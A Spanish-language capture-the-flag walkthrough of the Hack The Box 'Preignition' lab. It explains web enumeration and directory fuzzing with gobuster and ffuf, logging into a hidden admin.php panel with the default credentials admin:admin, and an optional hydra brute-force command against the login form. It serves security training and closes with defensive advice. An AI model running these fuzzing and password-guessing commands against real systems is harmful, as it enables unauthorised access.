# Hack The Box — Starting Point 6: Preignition

Notas sobre **enumeración web**, **fuzzing de directorios** con **`gobuster`** / **`ffuf`** / **`dirb`**, descubrimiento de un **panel de administración** y login con credenciales por defecto (`admin:admin`).

---

## Contexto

**Preignition** introduce el reconocimiento web básico. La máquina sirve una **web en el puerto 80/tcp** que no muestra contenido útil en `/`, pero esconde rutas como `/admin.php`. El objetivo: descubrir esa ruta por fuerza bruta de diccionario, entrar con credenciales débiles y leer la flag.

---

## Conceptos del módulo (respuestas a las tareas)

### Tarea 1 — Three letter acronym to describe ways of interacting with a webserver

**TTP** = *Tactics, Techniques and Procedures*. En el enunciado canónico del room también puede aceptarse **GET/PUT/POST** como verbos HTTP. La intención didáctica: hay verbos/métodos y herramientas estándar para hablar con un servidor web. Los métodos principales:

| Método | Uso |
|--------|-----|
| `GET` | Solicita un recurso (idempotente) |
| `POST` | Envía datos al servidor (formularios, APIs) |
| `PUT` | Crea/reemplaza un recurso |
| `DELETE` | Elimina un recurso |
| `HEAD` | Como GET, pero solo cabeceras |
| `OPTIONS` | Métodos permitidos por el endpoint |

### Tarea 2 — Term used to describe identifying resources on a webserver

**Enumeration** (enumeración web). Implica listar directorios, archivos, parámetros, vhosts, etc.

### Tarea 3 — Tool comúnmente usado para enumerar (¿hay alternativas?)

**`gobuster`**. Hecho en Go, rápido. Alternativas habituales:

- **`ffuf`** (muy rápido, soporta múltiples puntos de inyección con `FUZZ`).
- **`dirb`** (clásico, más lento).
- **`dirsearch`** (Python, buen output).
- **`feroxbuster`** (Rust, recursivo por defecto).
- **`wfuzz`** (versátil para parámetros/cabeceras).

### Tarea 4 — Modo de `gobuster` para enumerar directorios y archivos

**`dir`**. Otros modos:

- `dns`: subdominios.
- `vhost`: virtual hosts (por cabecera `Host`).
- `s3`: buckets de Amazon S3.
- `fuzz`: parámetros y similares.

### Tarea 5 — Tipo de petición HTTP que envía gobuster para detectar páginas

**`GET`** por defecto. Con `-m HEAD` puede usar solo cabeceras (más rápido pero menos preciso).

### Tarea 6 — Código HTTP 200

**OK** (la respuesta llegó correctamente). Códigos importantes para enumeración:

| Código | Significado | Relevancia |
|--------|-------------|------------|
| 200 | OK | Recurso existe y devuelve contenido |
| 301/302 | Redirect | Hay algo, redirige (sigue con `-r`) |
| 401 | Unauthorized | Existe pero necesita auth |
| 403 | Forbidden | Existe pero prohibido (¡pista!) |
| 404 | Not Found | No existe |
| 500 | Internal Error | Existe pero algo falla en backend |

### Tarea 7 — Login con credenciales por defecto

**`admin:admin`** (o `admin` / contraseña en blanco según el lab). Combinación típica de los formularios mal configurados.

## Metodología

### 1. Conectividad y escaneo

```bash
ping -c 4 TARGET_IP
nmap -sV -p- TARGET_IP
```

Esperado: **80/tcp open http** (Apache, nginx o similar).

### 2. Revisar la web manualmente

```bash
curl -i http://TARGET_IP/
```

- `curl`: cliente HTTP.
- `-i`: muestra cabeceras de respuesta.

Mira:

- **Código de estado** (200, 403…)
- Cabecera **`Server:`** (puede revelar tecnología).
- **`/robots.txt`** y `/sitemap.xml`:

```bash
curl http://TARGET_IP/robots.txt
```

Si en `/` hay un mensaje pero ninguna ruta visible → necesitas **fuzzing**.

### 3. Fuzzing de directorios con `gobuster`

**Sintaxis básica:**

```bash
gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

Desglose:

| Argumento | Función |
|-----------|---------|
| `dir` | Modo: directorios/archivos |
| `-u URL` | URL objetivo |
| `-w WORDLIST` | Diccionario de palabras a probar |
| `-x ext1,ext2` | Extensiones a probar (`php,html,txt`) |
| `-t 50` | Hilos concurrentes |
| `-s 200,204,301,302,307,401,403` | Códigos a mostrar (status) |
| `-b 404` | Códigos a ignorar (blacklist) |
| `-k` | No verificar TLS |
| `-r` | Seguir redirecciones |
| `-o salida.txt` | Guardar resultados |

**Ejemplo realista para Preignition (probando `.php`):**

```bash
gobuster dir -u http://TARGET_IP \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
  -x php,html,txt -t 50
```

Verás algo tipo:

```text
/admin.php  (Status: 200)
```

**Equivalente con `ffuf`:**

```bash
ffuf -u http://TARGET_IP/FUZZ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
  -e .php,.html,.txt -mc 200,301,302,403
```

- `FUZZ`: marcador de inyección.
- `-e`: extensiones.
- `-mc`: códigos a mostrar.

### 4. Acceder al panel descubierto

Abre en navegador o:

```bash
curl -i http://TARGET_IP/admin.php
```

Verás un formulario de login (usuario + contraseña).

### 5. Probar credenciales por defecto

**Manualmente** en el navegador:

- Usuario: `admin`
- Password: `admin`

**Con `curl` (POST):**

```bash
curl -i -X POST -d "username=admin&password=admin" http://TARGET_IP/admin.php
```

- `-X POST`: método.
- `-d "k=v&k=v"`: cuerpo `application/x-www-form-urlencoded`.

Tras un login válido se devuelve la flag (texto o redirección a otra página con el valor).

### 6. (Opcional) Fuerza bruta con `hydra` si el login no fuera trivial

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET_IP http-post-form \
  "/admin.php:username=^USER^&password=^PASS^:Invalid"
```

- `-l`: usuario fijo.
- `-P`: diccionario de contraseñas.
- `http-post-form`: módulo formulario POST.
- `^USER^` / `^PASS^`: placeholders.
- `Invalid`: cadena que aparece en respuesta de fallo.

---

## Lecciones de seguridad

- **Credenciales por defecto** en paneles administrativos siguen siendo una de las primeras causas de compromiso.
- **Rutas “ocultas” por oscuridad** no son seguridad: un diccionario de 5000 entradas las encuentra en segundos.
- Defensa: cambiar contraseñas iniciales, restringir el panel por IP/VPN, **rate-limiting**, **MFA** y monitorización de logs de acceso.

## Resumen de comandos

| Comando | Propósito |
|---------|-----------|
| `nmap -sV -p- TARGET_IP` | Confirmar 80/tcp y versión HTTP |
| `curl -i http://IP/` | Inspección manual de respuestas/cabeceras |
| `gobuster dir -u http://IP -w wordlist -x php` | Enumerar rutas y extensiones |
| `ffuf -u http://IP/FUZZ -w wordlist` | Alternativa rápida |
| `curl -X POST -d "user=...&pass=..." URL` | Probar login manual |
| `hydra ... http-post-form` | Bruteforce de formularios |
